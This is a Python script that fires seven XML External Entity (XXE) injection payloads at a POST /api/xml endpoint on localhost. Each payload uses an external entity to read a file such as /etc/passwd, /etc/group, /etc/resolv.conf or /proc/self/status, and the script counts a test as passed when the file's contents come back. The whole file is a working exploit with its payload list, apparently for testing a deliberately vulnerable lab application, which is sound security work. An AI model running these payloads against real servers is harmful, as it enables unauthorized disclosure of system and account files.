#!/usr/bin/env python3
"""
XXE (XML External Entity) Injection Test Script
Tests 7 payloads against POST /api/xml endpoint
Target: File disclosure via XML entity resolution
"""

import requests
import json
import sys
import time

BASE_URL = "http://localhost:5000"
DELAY = 1.5

PAYLOADS = [
    {
        "id": 1,
        "entity_path": "file:///etc/passwd",
        "description": "Basic XXE - read user accounts",
        "expected_content": "root:x:0:0",
    },
    {
        "id": 2,
        "entity_path": "file:///etc/hosts",
        "description": "XXE - read host mappings",
        "expected_content": "127.0.0.1",
    },
    {
        "id": 3,
        "entity_path": "file:///etc/group",
        "description": "XXE - read group information",
        "expected_content": "root:x:0",
    },
    {
        "id": 4,
        "entity_path": "file:///proc/version",
        "description": "XXE - read kernel version via procfs",
        "expected_content": "Linux",
    },
    {
        "id": 5,
        "entity_path": "file:///etc/lsb-release",
        "description": "XXE - read OS release information",
        "expected_content": "Ubuntu",
    },
    {
        "id": 6,
        "entity_path": "file:///etc/resolv.conf",
        "description": "XXE - read DNS resolver configuration",
        "expected_content": "nameserver",
    },
    {
        "id": 7,
        "entity_path": "file:///proc/self/status",
        "description": "XXE - read process status via procfs",
        "expected_content": "Name:",
    },
]

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
RESET = "\033[0m"


def build_xml(entity_path):
    """Build XXE payload XML with given entity path"""
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ELEMENT data ANY>
  <!ENTITY xxe SYSTEM "{entity_path}">
]>
<data>&xxe;</data>"""


def test_payload(payload):
    """Test a single XXE injection payload"""
    try:
        xml_data = build_xml(payload["entity_path"])

        response = requests.post(
            f"{BASE_URL}/api/xml",
            data=xml_data,
            headers={"Content-Type": "text/xml"},
            timeout=30,
        )

        data = response.json()

        passed = False
        result_detail = ""

        if data.get("status") == "success":
            file_content = ""
            for key, value in data.get("data", {}).items():
                file_content = value
                break

            if payload["expected_content"] in file_content:
                passed = True
                preview = file_content.strip()[:100].replace("\n", " | ")
                result_detail = f"Found '{payload['expected_content']}'"
                result_detail += f"\n    Preview: {preview}..."
            else:
                result_detail = f"'{payload['expected_content']}' not found"
                result_detail += f"\n    Data keys: {list(data.get('data', {}).keys())}"
        else:
            result_detail = f"Error: {data.get('message', 'Unknown')}"

        return {
            "id": payload["id"],
            "description": payload["description"],
            "entity_path": payload["entity_path"],
            "status_code": response.status_code,
            "passed": passed,
            "detail": result_detail,
        }

    except requests.exceptions.RequestException as e:
        return {
            "id": payload["id"],
            "description": payload["description"],
            "entity_path": payload["entity_path"],
            "status_code": 0,
            "passed": False,
            "detail": str(e),
        }


def print_report(results):
    """Print test results summary"""
    print("\n" + "=" * 70)
    print(f"{BOLD}XXE Injection Test Results - POST /api/xml{RESET}")
    print("=" * 70)

    passed_count = 0

    for r in results:
        status = f"{GREEN}PASS{RESET}" if r["passed"] else f"{RED}FAIL{RESET}"
        if r["passed"]:
            passed_count += 1

        print(f"\n  {BOLD}[{status}]{RESET} Payload #{r['id']}: {r['description']}")
        print(f"    Entity: {r['entity_path']}")
        print(f"    Response: HTTP {r['status_code']}")
        print(f"    {r['detail']}")

    print("\n" + "-" * 70)
    print(f"{BOLD}Summary: {passed_count}/{len(results)} payloads passed{RESET}")
    if passed_count == len(results):
        print(f"{GREEN}All files disclosed via XXE. Entity resolution confirmed vulnerable.{RESET}")
    elif passed_count > 0:
        print(f"{YELLOW}Some files were disclosed. XML parser is vulnerable to XXE.{RESET}")
    else:
        print(f"{RED}No files were disclosed via XXE.{RESET}")
    print("=" * 70 + "\n")


if __name__ == "__main__":
    print(f"{BOLD}[*] Starting XXE Injection tests against {BASE_URL}/api/xml{RESET}")
    print(f"[*] Testing {len(PAYLOADS)} payloads...\n")

    results = []
    for p in PAYLOADS:
        r = test_payload(p)
        results.append(r)
        time.sleep(DELAY)
    print_report(results)

    sys.exit(0 if any(r["passed"] for r in results) else 1)
